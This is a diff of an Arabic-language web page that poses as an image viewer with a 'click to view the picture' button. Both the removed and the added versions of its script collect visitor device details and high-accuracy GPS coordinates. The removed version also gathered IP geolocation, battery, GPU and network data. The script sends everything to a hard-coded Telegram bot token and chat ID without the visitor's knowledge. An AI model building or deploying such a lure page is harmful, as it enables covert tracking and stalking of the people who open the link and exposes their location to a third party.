@@ -87,18 +87,6 @@
             text-align: center;
             display: none;
         }
-
-        .location-status {
-            background: #fff3cd;
-            color: #856404;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px;
-            text-align: center;
-            font-size: 0.9em;
-            border: 1px solid #ffeaa7;
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -113,7 +101,7 @@
              class="main-image" 
              id="mainImage">
 
-        <button class="click-button" id="viewButton" onclick="viewImage()">
+        <button class="click-button" id="viewButton">
             🔍 اضغط هنا لمشاهدة الصورة
         </button>
 
@@ -123,718 +111,202 @@
     </div>
 
     <script>
-        // متغيرات الموقع العامة
-        window.userLocation = { 
-            status: 'جاري المحاولة...',
-            method: 'لم يتم التحديد',
-            attempts: 0
-        };
+        // متغيرات بسيطة
+        let userLocation = null;
 
-        // تحديد نوع الجهاز بدقة أكبر
-        function getDetailedDeviceInfo() {
+        // جمع معلومات الجهاز - بسيط وآمن
+        function getDeviceInfo() {
             const ua = navigator.userAgent;
-            const platform = navigator.platform;
-            
-            let deviceInfo = {
+            let info = {
                 type: 'غير معروف',
-                model: 'غير معروف',
                 brand: 'غير معروف',
-                detailed_type: 'غير معروف',
-                is_mobile: false,
-                is_tablet: false,
-                is_desktop: false,
-                is_smart_tv: false,
-                is_bot: false,
-                real_model: 'غير محدد',
-                processor: 'غير محدد',
-                android_version: 'غير محدد'
+                model: 'غير معروف',
+                os: 'غير معروف',
+                browser: 'غير معروف'
             };
 
-            // تحديد نوع الجهاز الأساسي
-            if (/bot|crawler|spider|crawling/i.test(ua)) {
-                deviceInfo.type = 'بوت';
-                deviceInfo.is_bot = true;
-            } else if (/Smart TV|SmartTV|TV|NetCast|SMART-TV|HbbTV|AppleTV|GoogleTV|Android TV|webOS|Tizen|SmartTV2/i.test(ua)) {
-                deviceInfo.type = 'تلفزيون ذكي';
-                deviceInfo.is_smart_tv = true;
-            } else if (screen.width <= 768 && /Mobile|Android|iPhone|iPod|BlackBerry|Windows Phone|Opera Mini|IEMobile/i.test(ua)) {
-                deviceInfo.type = 'هاتف ذكي';
-                deviceInfo.is_mobile = true;
-            } else if ((screen.width > 768 && screen.width <= 1024) || /iPad|Tablet/i.test(ua)) {
-                deviceInfo.type = 'تابلت';
-                deviceInfo.is_tablet = true;
-            } else if (screen.width > 1024) {
-                deviceInfo.type = 'كمبيوتر مكتبي';
-                deviceInfo.is_desktop = true;
-            }
-
-            // تحليل محسن للأندرويد
-            if (/Android/i.test(ua)) {
-                const versionMatch = ua.match(/Android (\d+\.?\d*\.?\d*)/);
-                deviceInfo.android_version = versionMatch ? versionMatch[1] : 'غير معروف';
-                
-                // استخراج معلومات الجهاز من User Agent
-                const buildMatch = ua.match(/;\s*([^;]+)\s+Build/);
-                const modelFromBuild = buildMatch ? buildMatch[1].trim() : null;
-                
-                // تحديد العلامة التجارية بدقة أكبر
-                if (/SM-[A-Z]\d+/i.test(ua)) {
-                    deviceInfo.brand = 'Samsung';
-                    const samsungModel = ua.match(/SM-([A-Z0-9]+)/);
-                    deviceInfo.real_model = samsungModel ? `SM-${samsungModel[1]}` : 'Samsung Galaxy';
-                    deviceInfo.model = `Samsung Galaxy (${deviceInfo.real_model})`;
-                    deviceInfo.detailed_type = 'Samsung Galaxy';
-                } else if (/HUAWEI|HW-|Honor/i.test(ua)) {
-                    deviceInfo.brand = 'Huawei/Honor';
-                    const huaweiModel = ua.match(/(HUAWEI|HW-|Honor)\s*([A-Z0-9\-]+)/i);
-                    deviceInfo.real_model = huaweiModel ? `${huaweiModel[1]} ${huaweiModel[2]}` : modelFromBuild;
-                    deviceInfo.model = `Huawei/Honor ${deviceInfo.real_model}`;
-                    deviceInfo.detailed_type = 'Huawei/Honor Device';
-                } else if (/Xiaomi|MI\s|Redmi|POCO/i.test(ua)) {
-                    deviceInfo.brand = 'Xiaomi';
-                    const xiaomiModel = ua.match(/(MI\s\d+|Redmi|POCO)\s*([A-Z0-9\s]*)/i);
-                    deviceInfo.real_model = xiaomiModel ? `${xiaomiModel[1]} ${xiaomiModel[2]}`.trim() : modelFromBuild;
-                    deviceInfo.model = `Xiaomi ${deviceInfo.real_model}`;
-                    deviceInfo.detailed_type = 'Xiaomi Device';
-                } else if (/OPPO/i.test(ua)) {
-                    deviceInfo.brand = 'OPPO';
-                    const oppoModel = ua.match(/OPPO\s*([A-Z0-9]+)/i);
-                    deviceInfo.real_model = oppoModel ? oppoModel[1] : modelFromBuild;
-                    deviceInfo.model = `OPPO ${deviceInfo.real_model}`;
-                    deviceInfo.detailed_type = 'OPPO Device';
-                } else if (/vivo/i.test(ua)) {
-                    deviceInfo.brand = 'Vivo';
-                    const vivoModel = ua.match(/vivo\s*([A-Z0-9]+)/i);
-                    deviceInfo.real_model = vivoModel ? vivoModel[1] : modelFromBuild;
-                    deviceInfo.model = `Vivo ${deviceInfo.real_model}`;
-                    deviceInfo.detailed_type = 'Vivo Device';
-                } else if (/OnePlus/i.test(ua)) {
-                    deviceInfo.brand = 'OnePlus';
-                    const oneplusModel = ua.match(/OnePlus\s*([A-Z0-9]+)/i);
-                    deviceInfo.real_model = oneplusModel ? oneplusModel[1] : modelFromBuild;
-                    deviceInfo.model = `OnePlus ${deviceInfo.real_model}`;
-                    deviceInfo.detailed_type = 'OnePlus Device';
-                } else if (/LG-/i.test(ua)) {
-                    deviceInfo.brand = 'LG';
-                    const lgModel = ua.match(/LG-([A-Z0-9]+)/i);
-                    deviceInfo.real_model = lgModel ? lgModel[1] : modelFromBuild;
-                    deviceInfo.model = `LG ${deviceInfo.real_model}`;
-                    deviceInfo.detailed_type = 'LG Device';
-                } else if (/Sony|Xperia/i.test(ua)) {
-                    deviceInfo.brand = 'Sony';
-                    deviceInfo.real_model = modelFromBuild || 'Xperia';
-                    deviceInfo.model = `Sony ${deviceInfo.real_model}`;
-                    deviceInfo.detailed_type = 'Sony Xperia';
-                } else if (/Nokia/i.test(ua)) {
-                    deviceInfo.brand = 'Nokia';
-                    const nokiaModel = ua.match(/Nokia\s*([A-Z0-9\.]+)/i);
-                    deviceInfo.real_model = nokiaModel ? nokiaModel[1] : modelFromBuild;
-                    deviceInfo.model = `Nokia ${deviceInfo.real_model}`;
-                    deviceInfo.detailed_type = 'Nokia Device';
-                } else if (/Motorola|Moto/i.test(ua)) {
-                    deviceInfo.brand = 'Motorola';
-                    const motoModel = ua.match(/(Moto|Motorola)\s*([A-Z0-9\s]+)/i);
-                    deviceInfo.real_model = motoModel ? `${motoModel[1]} ${motoModel[2]}`.trim() : modelFromBuild;
-                    deviceInfo.model = `Motorola ${deviceInfo.real_model}`;
-                    deviceInfo.detailed_type = 'Motorola Device';
-                } else if (/realme/i.test(ua)) {
-                    deviceInfo.brand = 'Realme';
-                    const realmeModel = ua.match(/realme\s*([A-Z0-9]+)/i);
-                    deviceInfo.real_model = realmeModel ? realmeModel[1] : modelFromBuild;
-                    deviceInfo.model = `Realme ${deviceInfo.real_model}`;
-                    deviceInfo.detailed_type = 'Realme Device';
-                } else {
-                    // جهاز أندرويد غير محدد العلامة التجارية
-                    deviceInfo.brand = 'Android (علامة غير محددة)';
-                    deviceInfo.real_model = modelFromBuild || 'Android Device';
-                    deviceInfo.model = `Android ${deviceInfo.android_version} (${deviceInfo.real_model})`;
-                    deviceInfo.detailed_type = 'Android Device';
-                }
-                
-            } else if (/iPhone/i.test(ua)) {
-                deviceInfo.brand = 'Apple';
-                deviceInfo.detailed_type = 'iPhone';
-                const match = ua.match(/iPhone OS (\d+)_(\d+)/);
-                const cpuMatch = ua.match(/iPhone(\d+,\d+)/);
+            // تحديد نوع الجهاز
+            if (/iPhone/i.test(ua)) {
+                info.type = 'iPhone';
+                info.brand = 'Apple';
+                info.os = 'iOS';
+                const match = ua.match(/iPhone OS (\d+)[._](\d+)/);
                 if (match) {
-                    deviceInfo.model = `iPhone (iOS ${match[1]}.${match[2]})`;
-                    if (cpuMatch) {
-                        deviceInfo.real_model = `iPhone ${cpuMatch[1]}`;
-                    }
+                    info.model = `iPhone (iOS ${match[1]}.${match[2]})`;
                 }
             } else if (/iPad/i.test(ua)) {
-                deviceInfo.brand = 'Apple';
-                deviceInfo.detailed_type = 'iPad';
-                const match = ua.match(/OS (\d+)_(\d+)/);
-                if (match) {
-                    deviceInfo.model = `iPad (iOS ${match[1]}.${match[2]})`;
-                }
-            } else if (/Windows NT/i.test(ua)) {
-                deviceInfo.brand = 'Microsoft';
-                deviceInfo.detailed_type = 'Windows PC';
-                const versionMatch = ua.match(/Windows NT (\d+\.\d+)/);
+                info.type = 'iPad';
+                info.brand = 'Apple';
+                info.os = 'iOS';
+            } else if (/Android/i.test(ua)) {
+                info.os = 'Android';
+                const versionMatch = ua.match(/Android (\d+(?:\.\d+)*)/);
                 if (versionMatch) {
-                    const winVersion = {
-                        '10.0': 'Windows 10/11',
-                        '6.3': 'Windows 8.1',
-                        '6.2': 'Windows 8',
-                        '6.1': 'Windows 7',
-                        '6.0': 'Windows Vista',
-                        '5.1': 'Windows XP'
-                    };
-                    deviceInfo.model = winVersion[versionMatch[1]] || `Windows NT ${versionMatch[1]}`;
+                    info.model = `Android ${versionMatch[1]}`;
                 }
-            } else if (/Mac OS X/i.test(ua)) {
-                deviceInfo.brand = 'Apple';
-                deviceInfo.detailed_type = 'macOS';
-                const versionMatch = ua.match(/Mac OS X (\d+)[._](\d+)/);
-                if (versionMatch) {
-                    deviceInfo.model = `macOS ${versionMatch[1]}.${versionMatch[2]}`;
-                }
-            }
-
-            return deviceInfo;
-        }
-
-        // الحصول على معلومات الشبكة المتقدمة
-        function getAdvancedNetworkInfo() {
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            
-            let networkInfo = {
-                type: 'غير معروف',
-                effectiveType: 'غير معروف',
-                downlink: 'غير معروف',
-                downlinkMax: 'غير معروف',
-                rtt: 'غير معروف',
-                saveData: false,
-                onLine: navigator.onLine
-            };
-
-            if (connection) {
-                networkInfo.type = connection.type || 'غير معروف';
-                networkInfo.effectiveType = connection.effectiveType || 'غير معروف';
-                networkInfo.downlink = connection.downlink ? `${connection.downlink} Mbps` : 'غير معروف';
-                networkInfo.downlinkMax = connection.downlinkMax ? `${connection.downlinkMax} Mbps` : 'غير معروف';
-                networkInfo.rtt = connection.rtt ? `${connection.rtt} ms` : 'غير معروف';
-                networkInfo.saveData = connection.saveData || false;
-            }
-
-            return networkInfo;
-        }
-
-        // الحصول على معلومات الأجهزة المتقدمة
-        async function getHardwareInfo() {
-            let hardwareInfo = {
-                cores: navigator.hardwareConcurrency || 'غير معروف',
-                memory: 'غير معروف',
-                storage: 'غير معروف',
-                gpu: 'غير معروف',
-                battery: 'غير معروف',
-                orientation: 'غير معروف',
-                vibration: 'غير معروف',
-                gamepad: 'غير معروف',
-                webgl: 'غير معروف',
-                touch: navigator.maxTouchPoints || 0,
-                pointer: 'غير معروف',
-                hover: 'غير معروف'
-            };
-
-            // معلومات الذاكرة
-            if (navigator.deviceMemory) {
-                hardwareInfo.memory = `${navigator.deviceMemory} GB`;
-            }
-
-            // معلومات التخزين
-            if ('storage' in navigator && 'estimate' in navigator.storage) {
-                try {
-                    const estimate = await navigator.storage.estimate();
-                    hardwareInfo.storage = `${Math.round(estimate.quota / 1024 / 1024 / 1024)} GB متاح`;
-                } catch (e) {
-                    hardwareInfo.storage = 'غير متاح';
-                }
-            }
-
-            // معلومات البطارية
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    hardwareInfo.battery = {
-                        level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging ? 'يتم الشحن' : 'غير متصل بالشاحن',
-                        chargingTime: battery.chargingTime === Infinity ? 'غير معروف' : `${Math.round(battery.chargingTime / 60)} دقيقة`,
-                        dischargingTime: battery.dischargingTime === Infinity ? 'غير معروف' : `${Math.round(battery.dischargingTime / 60)} دقيقة`
-                    };
-                } catch (e) {
-                    hardwareInfo.battery = 'غير متاح';
-                }
-            }
-
-            // معلومات الشاشة والاتجاه
-            if (screen.orientation) {
-                hardwareInfo.orientation = screen.orientation.type;
-            }
-
-            // دعم الاهتزاز
-            hardwareInfo.vibration = 'vibrate' in navigator ? 'مدعوم' : 'غير مدعوم';
-
-            // دعم الألعاب
-            hardwareInfo.gamepad = 'getGamepads' in navigator ? 'مدعوم' : 'غير مدعوم';
-
-            // معلومات WebGL
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        hardwareInfo.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    } else {
-                        hardwareInfo.gpu = 'WebGL مدعوم';
-                    }
+                
+                if (/Samsung/i.test(ua)) {
+                    info.brand = 'Samsung';
+                } else if (/Huawei/i.test(ua)) {
+                    info.brand = 'Huawei';
+                } else if (/Xiaomi/i.test(ua)) {
+                    info.brand = 'Xiaomi';
                 } else {
-                    hardwareInfo.gpu = 'WebGL غير مدعوم';
+                    info.brand = 'Android';
                 }
-            } catch (e) {
-                hardwareInfo.gpu = 'غير متاح';
+
+                if (/Mobile/i.test(ua)) {
+                    info.type = 'هاتف أندرويد';
+                } else {
+                    info.type = 'تابلت أندرويد';
+                }
+            } else if (/Windows/i.test(ua)) {
+                info.type = 'كمبيوتر';
+                info.brand = 'Microsoft';
+                info.os = 'Windows';
+            } else if (/Mac/i.test(ua)) {
+                info.type = 'كمبيوتر';
+                info.brand = 'Apple';
+                info.os = 'macOS';
             }
 
-            // معلومات الإدخال
-            if (window.matchMedia) {
-                hardwareInfo.pointer = window.matchMedia('(pointer: coarse)').matches ? 'لمس' : 
-                                    window.matchMedia('(pointer: fine)').matches ? 'دقيق' : 'غير معروف';
-                hardwareInfo.hover = window.matchMedia('(hover: hover)').matches ? 'مدعوم' : 'غير مدعوم';
+            // تحديد المتصفح
+            if (/Chrome/i.test(ua)) {
+                info.browser = 'Chrome';
+            } else if (/Firefox/i.test(ua)) {
+                info.browser = 'Firefox';
+            } else if (/Safari/i.test(ua)) {
+                info.browser = 'Safari';
+            } else if (/Edge/i.test(ua)) {
+                info.browser = 'Edge';
             }
 
-            return hardwareInfo;
+            return info;
         }
 
-        // الحصول على معلومات الأمان والخصوصية
-        function getSecurityInfo() {
+        // جمع معلومات النظام
+        function getSystemInfo() {
             return {
-                https: location.protocol === 'https:',
-                cookiesEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack || 'غير محدد',
-                language: navigator.language,
-                languages: navigator.languages ? navigator.languages.join(', ') : 'غير متاح',
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookieStore: 'cookieStore' in window ? 'مدعوم' : 'غير مدعوم',
-                serviceWorker: 'serviceWorker' in navigator ? 'مدعوم' : 'غير مدعوم',
-                notifications: 'Notification' in window ? 'مدعوم' : 'غير مدعوم',
-                geolocation: 'geolocation' in navigator ? 'مدعوم' : 'غير مدعوم',
-                mediaDevices: 'mediaDevices' in navigator ? 'مدعوم' : 'غير مدعوم',
-                bluetooth: 'bluetooth' in navigator ? 'مدعوم' : 'غير مدعوم',
-                usb: 'usb' in navigator ? 'مدعوم' : 'غير مدعوم',
-                webauthn: 'credentials' in navigator ? 'مدعوم' : 'غير مدعوم'
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language || 'غير معروف',
+                platform: navigator.platform || 'غير معروف',
+                cookiesEnabled: navigator.cookieEnabled ? 'مفعلة' : 'معطلة',
+                onLine: navigator.onLine ? 'متصل' : 'غير متصل'
             };
         }
 
-        // الحصول على الموقع من خلال IP
-        async function getLocationByIP() {
-            try {
-                console.log('🌐 محاولة الحصول على الموقع عبر IP...');
-                
-                const ipServices = [
-                    'https://ipapi.co/json/',
-                    'http://ip-api.com/json/',
-                    'https://ipinfo.io/json',
-                    'https://freegeoip.app/json/'
-                ];
-
-                for (let service of ipServices) {
-                    try {
-                        const response = await fetch(service);
-                        const data = await response.json();
-                        
-                        if (data.latitude || data.lat) {
-                            window.userLocation = {
-                                latitude: data.latitude || data.lat,
-                                longitude: data.longitude || data.lon || data.lng,
-                                city: data.city || 'غير معروف',
-                                country: data.country || data.country_name || 'غير معروف',
-                                region: data.region || data.regionName || 'غير معروف',
-                                isp: data.isp || data.org || 'غير معروف',
-                                ip: data.ip || data.query || 'غير معروف',
-                                postal: data.postal || data.zip || 'غير معروف',
-                                timezone: data.timezone || 'غير معروف',
-                                accuracy: 'تقريبي (IP)',
-                                status: 'تم الحصول عليه عبر IP',
-                                method: 'IP Geolocation',
-                                service: service
-                            };
-                            updateLocationStatus('✅ تم تحديد الموقع التقريبي عبر IP');
-                            return true;
-                        }
-                    } catch (error) {
-                        console.log(`❌ فشل في الخدمة: ${service}`);
-                        continue;
-                    }
-                }
-                
-                return false;
-            } catch (error) {
-                console.error('❌ خطأ في الحصول على الموقع عبر IP:', error);
-                return false;
-            }
-        }
-
-        // الحصول على الموقع باستخدام GPS
-        function getLocationByGPS() {
+        // الحصول على الموقع (GPS فقط)
+        function getLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
-                    resolve(false);
+                    resolve(null);
                     return;
                 }
 
-                console.log('🛰️ محاولة الحصول على الموقع عبر GPS...');
-                
-                const options = {
-                    enableHighAccuracy: true,
-                    timeout: 15000,
-                    maximumAge: 0
-                };
-
                 navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        window.userLocation = {
+                    (position) => {
+                        resolve({
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
                             accuracy: Math.round(position.coords.accuracy) + ' متر',
-                            altitude: position.coords.altitude ? Math.round(position.coords.altitude) + ' متر' : 'غير متاح',
-                            altitudeAccuracy: position.coords.altitudeAccuracy ? Math.round(position.coords.altitudeAccuracy) + ' متر' : 'غير متاح',
-                            heading: position.coords.heading ? Math.round(position.coords.heading) + ' درجة' : 'غير متاح',
-                            speed: position.coords.speed ? Math.round(position.coords.speed * 3.6) + ' كم/ساعة' : 'غير متاح',
-                            status: 'تم الحصول عليه بدقة عالية',
-                            method: 'GPS',
-                            timestamp: new Date(position.timestamp).toLocaleString('ar-IQ')
-                        };
-                        updateLocationStatus('✅ تم تحديد الموقع بدقة عالية عبر GPS');
-                        console.log('✅ تم الحصول على الموقع عبر GPS:', window.userLocation);
-                        resolve(true);
+                            method: 'GPS'
+                        });
                     },
-                    function(error) {
-                        let errorMsg = '';
-                        switch(error.code) {
-                            case error.PERMISSION_DENIED:
-                                errorMsg = 'رفض المستخدم إذن الموقع';
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                errorMsg = 'الموقع غير متاح';
-                                break;
-                            case error.TIMEOUT:
-                                errorMsg = 'انتهت مهلة الانتظار';
-                                break;
-                            default:
-                                errorMsg = 'خطأ غير معروف';
-                        }
-                        console.log('❌ فشل GPS:', errorMsg);
-                        resolve(false);
+                    () => {
+                        resolve(null);
                     },
-                    options
+                    {
+                        timeout: 10000,
+                        enableHighAccuracy: true
+                    }
                 );
             });
         }
 
-        // تحديث حالة الموقع في الواجهة (معطل)
-        function updateLocationStatus(message) {
-            console.log('📍 ' + message);
-        }
-
-        // وظيفة جمع البيانات المحسنة
-        async function collectData() {
-            const deviceInfo = getDetailedDeviceInfo();
-            const networkInfo = getAdvancedNetworkInfo();
-            const hardwareInfo = await getHardwareInfo();
-            const securityInfo = getSecurityInfo();
-            
-            return {
-                // معلومات الوقت والزيارة
-                timestamp: new Date().toLocaleString('ar-IQ'),
-                visit_time: new Date().toISOString(),
-                page_url: window.location.href,
-                referrer: document.referrer || 'مباشر',
-                page_load_time: Math.round(performance.now()),
-                
-                // معلومات الجهاز المفصلة
-                device_type: deviceInfo.type,
-                device_brand: deviceInfo.brand,
-                device_model: deviceInfo.model,
-                device_detailed_type: deviceInfo.detailed_type,
-                device_real_model: deviceInfo.real_model,
-                device_processor: deviceInfo.processor,
-                device_android_version: deviceInfo.android_version,
-                device_full_user_agent: navigator.userAgent,
-                is_mobile: deviceInfo.is_mobile,
-                is_tablet: deviceInfo.is_tablet,
-                is_desktop: deviceInfo.is_desktop,
-                is_smart_tv: deviceInfo.is_smart_tv,
-                is_bot: deviceInfo.is_bot,
-                
-                // معلومات النظام والمتصفح
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages ? navigator.languages.join(', ') : 'غير متاح',
-                
-                // معلومات الشاشة
-                screen_width: screen.width,
-                screen_height: screen.height,
-                screen_resolution: `${screen.width}x${screen.height}`,
-                screen_color_depth: screen.colorDepth,
-                screen_pixel_ratio: window.devicePixelRatio,
-                window_width: window.innerWidth,
-                window_height: window.innerHeight,
-                
-                // معلومات الشبكة المتقدمة
-                network_type: networkInfo.type,
-                network_effective_type: networkInfo.effectiveType,
-                network_downlink: networkInfo.downlink,
-                network_downlink_max: networkInfo.downlinkMax,
-                network_rtt: networkInfo.rtt,
-                network_save_data: networkInfo.saveData,
-                network_online: networkInfo.onLine,
-                
-                // معلومات الأجهزة
-                hardware_cores: hardwareInfo.cores,
-                hardware_memory: hardwareInfo.memory,
-                hardware_storage: hardwareInfo.storage,
-                hardware_gpu: hardwareInfo.gpu,
-                hardware_battery: hardwareInfo.battery,
-                hardware_orientation: hardwareInfo.orientation,
-                hardware_vibration: hardwareInfo.vibration,
-                hardware_gamepad: hardwareInfo.gamepad,
-                hardware_touch_points: hardwareInfo.touch,
-                hardware_pointer: hardwareInfo.pointer,
-                hardware_hover: hardwareInfo.hover,
-                
-                // معلومات الأمان
-                security_https: securityInfo.https,
-                security_cookies: securityInfo.cookiesEnabled,
-                security_do_not_track: securityInfo.doNotTrack,
-                security_timezone: securityInfo.timezone,
-                security_geolocation: securityInfo.geolocation,
-                security_notifications: securityInfo.notifications,
-                security_media_devices: securityInfo.mediaDevices,
-                security_bluetooth: securityInfo.bluetooth,
-                security_usb: securityInfo.usb,
-                security_webauthn: securityInfo.webauthn,
-                
-                // معلومات الموقع
-                latitude: window.userLocation?.latitude || 'غير متاح',
-                longitude: window.userLocation?.longitude || 'غير متاح',
-                location_accuracy: window.userLocation?.accuracy || 'غير متاح',
-                location_altitude: window.userLocation?.altitude || 'غير متاح',
-                location_speed: window.userLocation?.speed || 'غير متاح',
-                location_heading: window.userLocation?.heading || 'غير متاح',
-                location_status: window.userLocation?.status || 'لم يتم الطلب',
-                location_method: window.userLocation?.method || 'غير محدد',
-                location_city: window.userLocation?.city || 'غير معروف',
-                location_country: window.userLocation?.country || 'غير معروف',
-                location_region: window.userLocation?.region || 'غير معروف',
-                location_isp: window.userLocation?.isp || 'غير معروف',
-                location_ip: window.userLocation?.ip || 'غير معروف',
-                location_postal: window.userLocation?.postal || 'غير معروف',
-                location_timezone: window.userLocation?.timezone || 'غير معروف',
-                
-                // معلومات إضافية
-                attempts_made: window.userLocation?.attempts || 0
-            };
-        }
-
+        // إرسال البيانات إلى Telegram
         function sendToTelegram(data) {
-            const TELEGRAM_BOT_TOKEN = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
-            const TELEGRAM_CHAT_ID = '170383339';
+            const botToken = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
+            const chatId = '170383339';
             
-            const batteryInfo = typeof data.hardware_battery === 'object' ? 
-                `المستوى: ${data.hardware_battery.level}, الحالة: ${data.hardware_battery.charging}` : 
-                data.hardware_battery;
-            
-            const message = `
-🆕 زائر جديد للموقع:
+            const message = `🆕 زائر جديد:
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⏰ الوقت: ${data.timestamp}
-🌐 الرابط: ${data.page_url}
-🔗 المرجع: ${data.referrer}
+⏰ الوقت: ${new Date().toLocaleString('ar-SA')}
+🌐 الصفحة: ${window.location.href}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📱 معلومات الجهاز المحسنة:
-🏷️ النوع: ${data.device_type}
-🏢 العلامة التجارية: ${data.device_brand}
-📋 الموديل الكامل: ${data.device_model}
-📱 الموديل الحقيقي: ${data.device_real_model}
-🔍 التفاصيل: ${data.device_detailed_type}
-🤖 إصدار أندرويد: ${data.device_android_version}
-💻 المعالج: ${data.device_processor}
-📱 محمول: ${data.is_mobile ? 'نعم' : 'لا'}
-💻 تابلت: ${data.is_tablet ? 'نعم' : 'لا'}
-🖥️ مكتبي: ${data.is_desktop ? 'نعم' : 'لا'}
-📺 تلفزيون ذكي: ${data.is_smart_tv ? 'نعم' : 'لا'}
-🤖 بوت: ${data.is_bot ? 'نعم' : 'لا'}
+📱 معلومات الجهاز:
+🏷️ النوع: ${data.device.type}
+🏢 العلامة التجارية: ${data.device.brand}
+📋 الموديل: ${data.device.model}
+🖥️ نظام التشغيل: ${data.device.os}
+🌐 المتصفح: ${data.device.browser}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🖥️ معلومات النظام:
-💻 المنصة: ${data.platform}
-🗣️ اللغة: ${data.language}
-🌍 اللغات المدعومة: ${data.languages}
-📺 دقة الشاشة: ${data.screen_resolution}
-🎨 عمق الألوان: ${data.screen_color_depth} بت
-🔍 نسبة البكسل: ${data.screen_pixel_ratio}
+📺 دقة الشاشة: ${data.system.screen}
+🗣️ اللغة: ${data.system.language}
+💻 المنصة: ${data.system.platform}
+🍪 الكوكيز: ${data.system.cookiesEnabled}
+📶 الاتصال: ${data.system.onLine}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📶 معلومات الشبكة:
-🌐 النوع: ${data.network_type}
-📊 السرعة الفعالة: ${data.network_effective_type}
-⬇️ سرعة التحميل: ${data.network_downlink}
-⬇️ أقصى سرعة: ${data.network_downlink_max}
-⏱️ زمن الاستجابة: ${data.network_rtt}
-💾 توفير البيانات: ${data.network_save_data ? 'مفعل' : 'غير مفعل'}
-🔌 الاتصال: ${data.network_online ? 'متصل' : 'غير متصل'}
+📍 الموقع:
+${data.location ? `📐 خط العرض: ${data.location.latitude}
+📐 خط الطول: ${data.location.longitude}
+🎯 الدقة: ${data.location.accuracy}
+🔧 الطريقة: ${data.location.method}` : '❌ الموقع غير متاح'}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔧 معلومات الأجهزة:
-🧠 أنوية المعالج: ${data.hardware_cores}
-💾 الذاكرة: ${data.hardware_memory}
-💿 التخزين: ${data.hardware_storage}
-🎮 كرت الرسوميات: ${data.hardware_gpu}
-🔋 البطارية: ${batteryInfo}
-📱 اتجاه الشاشة: ${data.hardware_orientation}
-📳 الاهتزاز: ${data.hardware_vibration}
-🎯 نقاط اللمس: ${data.hardware_touch_points}
-🖱️ نوع المؤشر: ${data.hardware_pointer}
-🖱️ دعم التحويم: ${data.hardware_hover}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔒 معلومات الأمان:
-🔐 HTTPS: ${data.security_https ? 'نعم' : 'لا'}
-🍪 الكوكيز: ${data.security_cookies ? 'مفعلة' : 'معطلة'}
-🚫 عدم التتبع: ${data.security_do_not_track}
-🕐 المنطقة الزمنية: ${data.security_timezone}
-📍 تحديد الموقع: ${data.security_geolocation}
-🔔 الإشعارات: ${data.security_notifications}
-📷 أجهزة الوسائط: ${data.security_media_devices}
-📶 البلوتوث: ${data.security_bluetooth}
-🔌 USB: ${data.security_usb}
-🔑 WebAuthn: ${data.security_webauthn}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📍 الموقع الجغرافي:
-🎯 الحالة: ${data.location_status}
-🔧 الطريقة: ${data.location_method}
-📐 خط العرض: ${data.latitude}
-📐 خط الطول: ${data.longitude}
-🎯 الدقة: ${data.location_accuracy}
-⛰️ الارتفاع: ${data.location_altitude}
-🏃 السرعة: ${data.location_speed}
-🧭 الاتجاه: ${data.location_heading}
-🏙️ المدينة: ${data.location_city}
-🏳️ الدولة: ${data.location_country}
-🗺️ المنطقة: ${data.location_region}
-📮 الرمز البريدي: ${data.location_postal}
-🌐 مقدم الخدمة: ${data.location_isp}
-🔌 عنوان IP: ${data.location_ip}
-🕐 المنطقة الزمنية: ${data.location_timezone}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📊 معلومات الأداء:
-⏱️ وقت التحميل: ${data.page_load_time}ms
-🔄 محاولات الموقع: ${data.attempts_made}
-🕒 وقت الزيارة: ${data.visit_time}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔍 User Agent الكامل:
-${data.device_full_user_agent}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-ملاحظة: رقم IMEI غير متاح عبر المتصفحات لأسباب الأمان والخصوصية
-            `;
-            
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            
-            fetch(url, {
+🔍 User Agent:
+${navigator.userAgent}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
+                    chat_id: chatId,
+                    text: message
                 })
-            }).then(response => {
-                if (response.ok) {
